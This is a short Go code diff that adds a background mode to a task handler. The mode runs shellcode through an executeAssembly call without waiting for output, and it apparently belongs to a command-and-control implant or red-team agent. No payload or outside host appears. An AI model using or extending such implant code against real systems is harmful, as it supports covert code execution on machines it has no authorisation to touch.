@@ -33,10 +33,16 @@ func InitialiseTask(task *Task) error {
 }
 
 func TaskHandler(task *Task) (stdout []byte, err error) {
-    if len(task.Args) < 2 {
+    if len(task.Args) < 3 {
         s := []byte("Error in args number")
         return s, errors.New(string(s))
     }
+	if task.Args[2] == "background" {
+		go executeAssembly(task.Shellcode, task.Args[0], task.Args[1])
+		task.status = "completed"
+		stdout = []byte("Runned the executed assembly in the background. No Output will be catched.")
+		return stdout, nil
+	}
 	stdout, _, err = executeAssembly(task.Shellcode, task.Args[0], task.Args[1])
     if err != nil {
         Println("Error Occured --> ", err.Error())
